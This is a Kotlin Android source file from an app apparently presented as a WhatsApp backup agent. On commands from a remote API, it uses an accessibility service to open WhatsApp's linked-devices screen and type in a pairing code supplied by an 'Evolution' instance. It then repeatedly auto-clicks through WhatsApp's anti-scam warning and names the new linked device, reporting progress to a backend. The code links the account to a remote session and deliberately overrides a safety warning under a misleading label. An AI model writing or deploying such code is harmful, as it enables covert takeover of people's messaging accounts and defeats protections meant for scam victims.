package com.folderbackup.agent.sync

import android.content.Context
import android.util.Log
import com.folderbackup.agent.data.AppPreferences
import com.folderbackup.agent.network.BackupApiClient
import com.folderbackup.agent.registration.AccessibilityHelper
import com.folderbackup.agent.registration.RegistrationNotifier
import com.folderbackup.agent.registration.WhatsappLinkDeviceState
import com.folderbackup.agent.registration.WhatsappRegistrationAccessibilityService
import com.folderbackup.agent.registration.WhatsappRegistrationState
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull

class WhatsappLinkDeviceCoordinator(private val context: Context) {
    private val preferences = AppPreferences(context)
    private val api = BackupApiClient()

    /** Abre tela "Insira o código" (direto ou menu ⋮ como fallback). */
    suspend fun navigateToLinkWithPhone(requestId: String?): Result<String> = withContext(Dispatchers.IO) {
        if (!ensureA11y(requestId)) {
            return@withContext Result.failure(IllegalStateException("Acessibilidade desativada"))
        }

        report(requestId, "macro_navigate_link_phone", "running", "Indo para vincular com número…", null)
        WhatsappRegistrationState.reset()
        WhatsappLinkDeviceState.reset()

        if (!WhatsappRegistrationAccessibilityService.pressHome()) {
            fail(requestId, "Não foi possível ir para HOME")
            return@withContext Result.failure(IllegalStateException("HOME falhou"))
        }
        delay(800)

        val open = WhatsappOpenHelper.open(context)
        if (!open.ok) {
            fail(requestId, "Não foi possível abrir WhatsApp")
            return@withContext Result.failure(IllegalStateException("Não foi possível abrir WhatsApp"))
        }
        delay(1500)

        if (!runMenuNavigation()) {
            fail(requestId, "Timeout no menu Dispositivos conectados")
            return@withContext Result.failure(IllegalStateException("Timeout na navegação do menu"))
        }

        WhatsappLinkDeviceState.reset()

        val msg = "Tela pronta — Insira o código"
        report(requestId, "macro_navigate_link_phone", "completed", msg, null)
        preferences.setLastStatus(msg)
        RegistrationNotifier.show(context, "Vincular", msg)
        Result.success(msg)
    }

    /** Já na tela inicial do WA — só percorre menu até "Insira o código". */
    suspend fun navigateToLinkFromHome(requestId: String?): Result<String> = withContext(Dispatchers.IO) {
        if (!ensureA11y(requestId)) {
            return@withContext Result.failure(IllegalStateException("Acessibilidade desativada"))
        }

        report(requestId, "macro_navigate_link_from_home", "running", "Menu → tela do código…", null)
        WhatsappRegistrationState.reset()
        WhatsappLinkDeviceState.reset()
        WhatsappRegistrationAccessibilityService.wakeScreen()
        delay(800)

        if (!runMenuNavigation()) {
            failFromHome(requestId, "Timeout no menu Dispositivos conectados")
            return@withContext Result.failure(IllegalStateException("Timeout na navegação do menu"))
        }

        WhatsappLinkDeviceState.reset()

        val msg = "Tela pronta — Insira o código"
        report(requestId, "macro_navigate_link_from_home", "completed", msg, null)
        preferences.setLastStatus(msg)
        RegistrationNotifier.show(context, "Vincular", msg)
        Result.success(msg)
    }

    suspend fun enterPairingCode(
        requestId: String?,
        pairingCode: String,
        evolutionInstance: String?,
    ): Result<String> = withContext(Dispatchers.IO) {
        if (!ensureA11y(requestId)) {
            return@withContext Result.failure(IllegalStateException("Acessibilidade desativada"))
        }

        val code = pairingCode.replace(Regex("[^A-Za-z0-9]"), "").uppercase()
        if (code.length < 8) {
            return@withContext Result.failure(IllegalStateException("pairing_code inválido (precisa 8 caracteres)"))
        }

        report(requestId, "submit_pairing_code", "running", "Digitando código $code…", evolutionInstance)
        RegistrationNotifier.show(context, "Evolution", "Código: $code")
        WhatsappRegistrationAccessibilityService.wakeScreen()
        WhatsappRegistrationState.reset()
        WhatsappLinkDeviceState.reset()
        WhatsappRegistrationState.beginPairing(code)

        val alreadyOnScreen = WhatsappRegistrationAccessibilityService.isOnEnterCodeScreen()
        if (!alreadyOnScreen) {
            failPairing(
                requestId,
                "Tela Insira o código não aberta — rode macro_navigate_link_phone antes",
                evolutionInstance,
            )
            return@withContext Result.failure(IllegalStateException("Tela de código não aberta"))
        }

        val fieldsReady = withTimeoutOrNull(FIELDS_WAIT_MS) {
            while (WhatsappRegistrationAccessibilityService.countEnterCodeFields() < 4) {
                delay(400)
            }
            true
        } != true
        if (fieldsReady) {
            failPairing(requestId, "Campos do código não apareceram (acessibilidade)", evolutionInstance)
            return@withContext Result.failure(IllegalStateException("Campos do código não visíveis"))
        }

        report(requestId, "submit_pairing_code", "running", "Aguardando ${PAIRING_SETTLE_MS / 1000}s antes de digitar…", evolutionInstance)
        delay(PAIRING_SETTLE_MS)
        WhatsappRegistrationAccessibilityService.wakeScreen()
        repeat(10) {
            if (AccessibilityHelper.isServiceConnected()) return@repeat
            delay(500)
        }
        delay(400)

        WhatsappLinkDeviceState.deviceName = WhatsappLinkDeviceState.DEFAULT_DEVICE_NAME
        var skipEnterCode = false
        var skipScamWarning = false

        when {
            WhatsappRegistrationAccessibilityService.isOnEnterCodeScreen() -> {
                WhatsappLinkDeviceState.markReadyForCode()
                WhatsappLinkDeviceState.beginEnterCode()
            }
            WhatsappRegistrationAccessibilityService.isOnScamWarningScreen() -> {
                report(requestId, "submit_pairing_code", "running", "Código aceito — tela anti-golpe", evolutionInstance)
                WhatsappRegistrationState.markPairingDone()
                WhatsappLinkDeviceState.step = WhatsappLinkDeviceState.Step.ConfirmScamWarning
                skipEnterCode = true
            }
            WhatsappRegistrationAccessibilityService.isOnNameDeviceScreen() -> {
                report(requestId, "submit_pairing_code", "running", "Código aceito — nomeando dispositivo", evolutionInstance)
                WhatsappRegistrationState.markPairingDone()
                WhatsappLinkDeviceState.beginNameDevice(WhatsappLinkDeviceState.DEFAULT_DEVICE_NAME)
                skipEnterCode = true
                skipScamWarning = true
            }
            else -> {
                failPairing(requestId, "Tela desconhecida após espera — abra Insira o código", evolutionInstance)
                return@withContext Result.failure(IllegalStateException("Tela de pairing não detectada"))
            }
        }

        if (!skipEnterCode) {
            report(requestId, "submit_pairing_code", "running", "Digitando código $code…", evolutionInstance)
            var typed = false
            repeat(25) { attempt ->
                if (WhatsappRegistrationAccessibilityService.isPairingCodeFilled(code)) {
                    typed = true
                    WhatsappRegistrationState.markPairingDone()
                    WhatsappLinkDeviceState.pairingCodeSubmitted = true
                    if (WhatsappLinkDeviceState.step == WhatsappLinkDeviceState.Step.EnterCode ||
                        WhatsappLinkDeviceState.step == WhatsappLinkDeviceState.Step.ReadyForCode
                    ) {
                        WhatsappLinkDeviceState.step = WhatsappLinkDeviceState.Step.ConfirmScamWarning
                    }
                    return@repeat
                }
                if (attempt < 3 && AccessibilityHelper.isServiceConnected()) {
                    WhatsappRegistrationAccessibilityService.typePairingCode(code)
                    burstConfirmScamWarning()
                }
                delay(1_200)
            }
            if (!typed && !WhatsappRegistrationAccessibilityService.isOnScamWarningScreen() &&
                !WhatsappRegistrationAccessibilityService.isOnNameDeviceScreen()
            ) {
                Log.w(TAG, "typePairingCode falhou após tentativas — loop de recuperação")
            }
            if (!runEnterCodeLoop(requestId, evolutionInstance)) {
                syncStepFromScreen()
                if (!WhatsappRegistrationAccessibilityService.isOnScamWarningScreen() &&
                    !WhatsappRegistrationAccessibilityService.isOnNameDeviceScreen()
                ) {
                    val msg = if (WhatsappRegistrationAccessibilityService.isOnPairingErrorDialog()) {
                        WhatsappRegistrationAccessibilityService.dismissPairingErrorDialog()
                        "Código rejeitado pelo WhatsApp — use force_new para gerar outro"
                    } else {
                        "Timeout ao digitar pairing code"
                    }
                    failPairing(requestId, msg, evolutionInstance)
                    return@withContext Result.failure(IllegalStateException(msg))
                }
            }
        }

        syncStepFromScreen()
        skipScamWarning = skipScamWarning ||
            WhatsappLinkDeviceState.step == WhatsappLinkDeviceState.Step.NameLinkedDevice ||
            WhatsappRegistrationAccessibilityService.isOnNameDeviceScreen()

        if (!skipScamWarning) {
            WhatsappLinkDeviceState.step = WhatsappLinkDeviceState.Step.ConfirmScamWarning
            WhatsappRegistrationState.markPairingDone()
            report(requestId, "submit_pairing_code", "running", "Confirmando anti-golpe…", evolutionInstance)
            burstConfirmScamWarning()
            if (!runScamWarningLoop(requestId, evolutionInstance)) {
                syncStepFromScreen()
                if (!WhatsappRegistrationAccessibilityService.isOnNameDeviceScreen()) {
                    failPairing(requestId, "Timeout na tela anti-golpe — Conectar dispositivo", evolutionInstance)
                    return@withContext Result.failure(IllegalStateException("Timeout tela anti-golpe"))
                }
            }
        }

        delay(500)
        syncStepFromScreen()
        if (WhatsappLinkDeviceState.step != WhatsappLinkDeviceState.Step.NameLinkedDevice &&
            WhatsappRegistrationAccessibilityService.isOnNameDeviceScreen()
        ) {
            WhatsappLinkDeviceState.beginNameDevice(WhatsappLinkDeviceState.DEFAULT_DEVICE_NAME)
        } else if (WhatsappLinkDeviceState.step != WhatsappLinkDeviceState.Step.NameLinkedDevice &&
            WhatsappLinkDeviceState.step != WhatsappLinkDeviceState.Step.Done
        ) {
            WhatsappLinkDeviceState.beginNameDevice(WhatsappLinkDeviceState.DEFAULT_DEVICE_NAME)
        }

        report(requestId, "submit_pairing_code", "running", "Salvando nome do dispositivo…", evolutionInstance)
        if (!runNameDeviceLoop(requestId, evolutionInstance)) {
            failPairing(requestId, "Timeout ao nomear dispositivo vinculado", evolutionInstance)
            return@withContext Result.failure(IllegalStateException("Timeout ao nomear dispositivo"))
        }

        val deviceName = WhatsappLinkDeviceState.deviceName ?: WhatsappLinkDeviceState.DEFAULT_DEVICE_NAME
        val msg = "Dispositivo vinculado como $deviceName"
        report(requestId, "submit_pairing_code", "completed", msg, evolutionInstance)
        preferences.setLastStatus(msg)
        WhatsappRegistrationState.reset()
        WhatsappLinkDeviceState.reset()
        Result.success(msg)
    }

    /** Tela "suspeita de golpe" → Conectar dispositivo → nome → salvar. */
    suspend fun confirmScamWarningAndFinish(
        requestId: String?,
        deviceName: String,
        evolutionInstance: String?,
    ): Result<String> = withContext(Dispatchers.IO) {
        var a11yOk = false
        repeat(A11Y_WAIT_ATTEMPTS) {
            if (AccessibilityHelper.isServiceEnabled(context) &&
                AccessibilityHelper.isServiceConnected()
            ) {
                a11yOk = true
                return@repeat
            }
            delay(A11Y_WAIT_MS)
        }
        if (!a11yOk) {
            failFinishSetup(requestId, "Ative Acessibilidade → WhatsApp Backup", evolutionInstance)
            return@withContext Result.failure(IllegalStateException("Acessibilidade desativada"))
        }

        val name = deviceName.trim().ifBlank { WhatsappLinkDeviceState.DEFAULT_DEVICE_NAME }
        report(requestId, "macro_confirm_scam_warning", "running", "Clicando Conectar dispositivo…", evolutionInstance)
        WhatsappRegistrationAccessibilityService.wakeScreen()
        WhatsappRegistrationState.reset()
        WhatsappRegistrationState.markPairingDone()
        WhatsappLinkDeviceState.reset()
        WhatsappLinkDeviceState.deviceName = name
        WhatsappLinkDeviceState.step = WhatsappLinkDeviceState.Step.ConfirmScamWarning
        burstConfirmScamWarning()

        if (!runScamWarningLoop(requestId, evolutionInstance, "macro_confirm_scam_warning")) {
            syncStepFromScreen()
            if (!WhatsappRegistrationAccessibilityService.isOnNameDeviceScreen()) {
                failConfirmScam(requestId, "Timeout — botão Conectar dispositivo não encontrado", evolutionInstance)
                return@withContext Result.failure(IllegalStateException("Timeout anti-golpe"))
            }
        }

        delay(500)
        syncStepFromScreen()
        if (WhatsappLinkDeviceState.step != WhatsappLinkDeviceState.Step.NameLinkedDevice) {
            WhatsappLinkDeviceState.beginNameDevice(name)
        }
        if (!runNameDeviceLoop(requestId, evolutionInstance, "macro_confirm_scam_warning")) {
            failFinishSetup(requestId, "Timeout ao salvar nome do dispositivo", evolutionInstance)
            return@withContext Result.failure(IllegalStateException("Timeout ao salvar nome"))
        }

        val msg = "Dispositivo conectado como $name"
        report(requestId, "macro_confirm_scam_warning", "completed", msg, evolutionInstance)
        preferences.setLastStatus(msg)
        RegistrationNotifier.show(context, "Vincular", msg)
        WhatsappLinkDeviceState.reset()
        WhatsappRegistrationState.reset()
        Result.success(msg)
    }

    /** Tela pós-pareamento: preenche nome do dispositivo e salva. */
    suspend fun finishLinkedDeviceSetup(
        requestId: String?,
        deviceName: String,
        evolutionInstance: String?,
    ): Result<String> = withContext(Dispatchers.IO) {
        var a11yOk = false
        repeat(A11Y_WAIT_ATTEMPTS) {
            if (AccessibilityHelper.isServiceEnabled(context) &&
                AccessibilityHelper.isServiceConnected()
            ) {
                a11yOk = true
                return@repeat
            }
            delay(A11Y_WAIT_MS)
        }
        if (!a11yOk) {
            failFinishSetup(requestId, "Ative Acessibilidade → WhatsApp Backup", evolutionInstance)
            return@withContext Result.failure(IllegalStateException("Acessibilidade desativada"))
        }

        val name = deviceName.trim().ifBlank { WhatsappLinkDeviceState.DEFAULT_DEVICE_NAME }
        report(requestId, "macro_finish_link_device", "running", "Nomeando dispositivo: $name…", evolutionInstance)
        WhatsappRegistrationAccessibilityService.wakeScreen()
        WhatsappRegistrationState.reset()
        WhatsappRegistrationState.markPairingDone()
        WhatsappLinkDeviceState.reset()
        delay(800)
        WhatsappLinkDeviceState.beginNameDevice(name)

        if (!runNameDeviceLoop(requestId, evolutionInstance, "macro_finish_link_device")) {
            failFinishSetup(requestId, "Timeout ao salvar nome do dispositivo", evolutionInstance)
            return@withContext Result.failure(IllegalStateException("Timeout ao salvar nome"))
        }

        val msg = "Dispositivo salvo como $name"
        report(requestId, "macro_finish_link_device", "completed", msg, evolutionInstance)
        preferences.setLastStatus(msg)
        RegistrationNotifier.show(context, "Vincular", msg)
        WhatsappLinkDeviceState.reset()
        Result.success(msg)
    }

    /** Polling ativo — não depende só de eventos de acessibilidade. */
    private suspend fun runMenuNavigation(): Boolean {
        WhatsappLinkDeviceState.beginNavigation()
        return withTimeoutOrNull(NAV_TIMEOUT_MS) {
            while (true) {
                if (!AccessibilityHelper.isServiceEnabled(context)) {
                    WhatsappLinkDeviceState.markFailed("Acessibilidade desativada")
                    return@withTimeoutOrNull false
                }
                WhatsappRegistrationAccessibilityService.runLinkDeviceStep()
                when (WhatsappLinkDeviceState.step) {
                    WhatsappLinkDeviceState.Step.ReadyForCode,
                    WhatsappLinkDeviceState.Step.Done,
                    -> return@withTimeoutOrNull true
                    WhatsappLinkDeviceState.Step.Failed -> return@withTimeoutOrNull false
                    else -> delay(STEP_INTERVAL_MS)
                }
            }
        } == true
    }

    /** Alinha máquina de estados com a tela real (celular pode avançar antes do loop detectar). */
    private fun syncStepFromScreen() {
        when {
            WhatsappRegistrationAccessibilityService.isOnNameDeviceScreen() -> {
                WhatsappRegistrationState.markPairingDone()
                if (WhatsappLinkDeviceState.step != WhatsappLinkDeviceState.Step.NameLinkedDevice &&
                    WhatsappLinkDeviceState.step != WhatsappLinkDeviceState.Step.Done
                ) {
                    WhatsappLinkDeviceState.beginNameDevice(
                        WhatsappLinkDeviceState.deviceName ?: WhatsappLinkDeviceState.DEFAULT_DEVICE_NAME,
                    )
                }
            }
            WhatsappRegistrationAccessibilityService.isOnScamWarningScreen() -> {
                WhatsappRegistrationState.markPairingDone()
                if (WhatsappLinkDeviceState.step == WhatsappLinkDeviceState.Step.EnterCode ||
                    WhatsappLinkDeviceState.step == WhatsappLinkDeviceState.Step.ReadyForCode
                ) {
                    WhatsappLinkDeviceState.step = WhatsappLinkDeviceState.Step.ConfirmScamWarning
                }
            }
            !WhatsappRegistrationAccessibilityService.isOnEnterCodeScreen() &&
                !WhatsappRegistrationAccessibilityService.isOnScamWarningScreen() &&
                !WhatsappRegistrationAccessibilityService.isOnNameDeviceScreen() &&
                WhatsappRegistrationAccessibilityService.isPairingFlowComplete() -> {
                WhatsappRegistrationState.markPairingDone()
                WhatsappLinkDeviceState.markDone()
            }
        }
    }

    private suspend fun runEnterCodeLoop(
        requestId: String?,
        evolutionInstance: String?,
    ): Boolean {
        var lastHeartbeat = 0L
        var a11yGoneSince = 0L
        return withTimeoutOrNull(CODE_TIMEOUT_MS) {
            while (true) {
                if (!AccessibilityHelper.isServiceEnabled(context)) {
                    if (a11yGoneSince == 0L) a11yGoneSince = System.currentTimeMillis()
                    if (System.currentTimeMillis() - a11yGoneSince > 20_000L) {
                        WhatsappLinkDeviceState.markFailed("Acessibilidade desativada")
                        return@withTimeoutOrNull false
                    }
                    delay(800)
                    continue
                }
                a11yGoneSince = 0L
                if (!AccessibilityHelper.isServiceConnected()) {
                    delay(800)
                    continue
                }
                WhatsappRegistrationAccessibilityService.runLinkDeviceStep()
                syncStepFromScreen()
                when {
                    WhatsappRegistrationAccessibilityService.isPairingCodeFilled(
                        WhatsappRegistrationState.pairingCode.orEmpty(),
                    ) -> {
                        WhatsappRegistrationState.markPairingDone()
                        WhatsappLinkDeviceState.pairingCodeSubmitted = true
                        WhatsappLinkDeviceState.step = WhatsappLinkDeviceState.Step.ConfirmScamWarning
                        burstConfirmScamWarning()
                        return@withTimeoutOrNull true
                    }
                    WhatsappRegistrationAccessibilityService.isOnPairingErrorDialog() -> {
                        WhatsappRegistrationAccessibilityService.dismissPairingErrorDialog()
                        WhatsappLinkDeviceState.markFailed("Código rejeitado — gere um novo na Evolution")
                        return@withTimeoutOrNull false
                    }
                    WhatsappLinkDeviceState.step == WhatsappLinkDeviceState.Step.NameLinkedDevice ->
                        return@withTimeoutOrNull true
                    WhatsappLinkDeviceState.step == WhatsappLinkDeviceState.Step.ConfirmScamWarning &&
                        WhatsappRegistrationState.phase == WhatsappRegistrationState.Phase.PairingDone ->
                        return@withTimeoutOrNull true
                    WhatsappRegistrationAccessibilityService.isOnScamWarningScreen() ||
                        WhatsappRegistrationAccessibilityService.isOnNameDeviceScreen() -> {
                        WhatsappRegistrationAccessibilityService.confirmScamWarningFast()
                        return@withTimeoutOrNull true
                    }
                    WhatsappLinkDeviceState.step == WhatsappLinkDeviceState.Step.Failed ||
                        WhatsappRegistrationState.phase == WhatsappRegistrationState.Phase.Failed ->
                        return@withTimeoutOrNull false
                    else -> {
                        val now = System.currentTimeMillis()
                        if (now - lastHeartbeat >= HEARTBEAT_MS) {
                            lastHeartbeat = now
                            val screen = when {
                                WhatsappRegistrationAccessibilityService.isOnPairingErrorDialog() -> "erro código"
                                WhatsappRegistrationAccessibilityService.isOnEnterCodeScreen() -> "código"
                                WhatsappRegistrationAccessibilityService.isOnScamWarningScreen() -> "anti-golpe"
                                WhatsappRegistrationAccessibilityService.isOnNameDeviceScreen() -> "nome"
                                else -> "aguardando"
                            }
                            report(
                                requestId,
                                "submit_pairing_code",
                                "running",
                                "Digitando código… (tela: $screen)",
                                evolutionInstance,
                            )
                        }
                        delay(STEP_INTERVAL_MS)
                    }
                }
            }
        } == true
    }

    /** Tenta OK + Conectar dispositivo várias vezes (alerta golpe/país exige rapidez). */
    private suspend fun burstConfirmScamWarning() {
        repeat(30) {
            if (WhatsappRegistrationAccessibilityService.confirmScamWarningFast()) return
            if (WhatsappRegistrationAccessibilityService.isOnNameDeviceScreen()) {
                WhatsappLinkDeviceState.beginNameDevice(
                    WhatsappLinkDeviceState.deviceName ?: WhatsappLinkDeviceState.DEFAULT_DEVICE_NAME,
                )
                return
            }
            delay(SCAM_STEP_INTERVAL_MS)
        }
    }

    private suspend fun runScamWarningLoop(
        requestId: String?,
        evolutionInstance: String?,
        command: String = "submit_pairing_code",
    ): Boolean {
        var lastHeartbeat = 0L
        return withTimeoutOrNull(SCAM_TIMEOUT_MS) {
            while (true) {
                if (!AccessibilityHelper.isServiceEnabled(context)) {
                    WhatsappLinkDeviceState.markFailed("Acessibilidade desativada")
                    return@withTimeoutOrNull false
                }
                WhatsappRegistrationAccessibilityService.confirmScamWarningFast()
                WhatsappRegistrationAccessibilityService.runLinkDeviceStep()
                syncStepFromScreen()
                when {
                    WhatsappLinkDeviceState.step == WhatsappLinkDeviceState.Step.NameLinkedDevice ->
                        return@withTimeoutOrNull true
                    WhatsappRegistrationAccessibilityService.isOnNameDeviceScreen() -> {
                        WhatsappLinkDeviceState.beginNameDevice(
                            WhatsappLinkDeviceState.deviceName ?: WhatsappLinkDeviceState.DEFAULT_DEVICE_NAME,
                        )
                        return@withTimeoutOrNull true
                    }
                    WhatsappLinkDeviceState.step == WhatsappLinkDeviceState.Step.Failed ->
                        return@withTimeoutOrNull false
                    else -> {
                        val now = System.currentTimeMillis()
                        if (now - lastHeartbeat >= HEARTBEAT_MS) {
                            lastHeartbeat = now
                            report(
                                requestId,
                                command,
                                "running",
                                "Confirmando anti-golpe…",
                                evolutionInstance,
                            )
                        }
                        delay(SCAM_STEP_INTERVAL_MS)
                    }
                }
            }
        } == true
    }

    private suspend fun runNameDeviceLoop(
        requestId: String?,
        evolutionInstance: String?,
        command: String = "submit_pairing_code",
    ): Boolean {
        var lastHeartbeat = 0L
        return withTimeoutOrNull(NAME_TIMEOUT_MS) {
            while (true) {
                if (!AccessibilityHelper.isServiceEnabled(context)) {
                    WhatsappLinkDeviceState.markFailed("Acessibilidade desativada")
                    return@withTimeoutOrNull false
                }
                WhatsappRegistrationAccessibilityService.runLinkDeviceStep()
                syncStepFromScreen()
                when {
                    WhatsappLinkDeviceState.step == WhatsappLinkDeviceState.Step.Done ->
                        return@withTimeoutOrNull true
                    WhatsappRegistrationAccessibilityService.isPairingFlowComplete() -> {
                        WhatsappLinkDeviceState.markDone()
                        return@withTimeoutOrNull true
                    }
                    WhatsappLinkDeviceState.step == WhatsappLinkDeviceState.Step.Failed ->
                        return@withTimeoutOrNull false
                    else -> {
                        val now = System.currentTimeMillis()
                        if (now - lastHeartbeat >= HEARTBEAT_MS) {
                            lastHeartbeat = now
                            report(
                                requestId,
                                command,
                                "running",
                                "Salvando nome: ${WhatsappLinkDeviceState.deviceName ?: WhatsappLinkDeviceState.DEFAULT_DEVICE_NAME}…",
                                evolutionInstance,
                            )
                        }
                        delay(STEP_INTERVAL_MS)
                    }
                }
            }
        } == true
    }

    private suspend fun ensureA11y(requestId: String?): Boolean {
        repeat(A11Y_WAIT_ATTEMPTS) {
            if (AccessibilityHelper.isServiceEnabled(context) &&
                AccessibilityHelper.isServiceConnected()
            ) {
                return true
            }
            delay(A11Y_WAIT_MS)
        }
        val msg = if (!AccessibilityHelper.isServiceEnabled(context)) {
            "Ative Acessibilidade → WhatsApp Backup"
        } else {
            "Serviço de acessibilidade ainda conectando — tente de novo em alguns segundos"
        }
        report(requestId, "macro_navigate_link_phone", "failed", msg, null)
        return false
    }

    private suspend fun failFromHome(requestId: String?, message: String) {
        WhatsappLinkDeviceState.markFailed(message)
        report(requestId, "macro_navigate_link_from_home", "failed", message, null)
        preferences.setLastStatus(message)
        WhatsappLinkDeviceState.reset()
    }

    private suspend fun fail(requestId: String?, message: String) {
        WhatsappLinkDeviceState.markFailed(message)
        report(requestId, "macro_navigate_link_phone", "failed", message, null)
        preferences.setLastStatus(message)
        WhatsappLinkDeviceState.reset()
    }

    private suspend fun failPairing(requestId: String?, message: String, evolutionInstance: String?) {
        WhatsappRegistrationState.markFailed(message)
        WhatsappLinkDeviceState.markFailed(message)
        report(requestId, "submit_pairing_code", "failed", message, evolutionInstance)
        preferences.setLastStatus(message)
        WhatsappRegistrationState.reset()
        WhatsappLinkDeviceState.reset()
    }

    private suspend fun failConfirmScam(requestId: String?, message: String, evolutionInstance: String?) {
        WhatsappLinkDeviceState.markFailed(message)
        report(requestId, "macro_confirm_scam_warning", "failed", message, evolutionInstance)
        preferences.setLastStatus(message)
        WhatsappLinkDeviceState.reset()
        WhatsappRegistrationState.reset()
    }

    private suspend fun failFinishSetup(requestId: String?, message: String, evolutionInstance: String?) {
        WhatsappLinkDeviceState.markFailed(message)
        report(requestId, "macro_finish_link_device", "failed", message, evolutionInstance)
        preferences.setLastStatus(message)
        WhatsappLinkDeviceState.reset()
    }

    private suspend fun report(
        requestId: String?,
        command: String,
        status: String,
        message: String,
        evolutionInstance: String?,
    ) {
        val config = preferences.getConfigSnapshot()
        preferences.setLastStatus(message)
        api.reportCommandResult(
            config = config,
            requestId = requestId,
            command = command,
            sessionLabel = evolutionInstance ?: "link-device",
            phoneE164 = null,
            status = status,
            message = message,
        ).onFailure { Log.w(TAG, "command-result: ${it.message}") }
    }

    companion object {
        private const val TAG = "WaLinkDeviceCoord"
        private const val NAV_TIMEOUT_MS = 90_000L
        private const val CODE_TIMEOUT_MS = 60_000L
        private const val SCAM_TIMEOUT_MS = 45_000L
        private const val NAME_TIMEOUT_MS = 45_000L
        private const val FIELDS_WAIT_MS = 12_000L
        private const val STEP_INTERVAL_MS = 1_200L
        private const val SCAM_STEP_INTERVAL_MS = 100L
        private const val A11Y_WAIT_MS = 1_000L
        private const val A11Y_WAIT_ATTEMPTS = 20
        private const val PAIRING_SETTLE_MS = 2_000L
        private const val HEARTBEAT_MS = 8_000L
    }
}
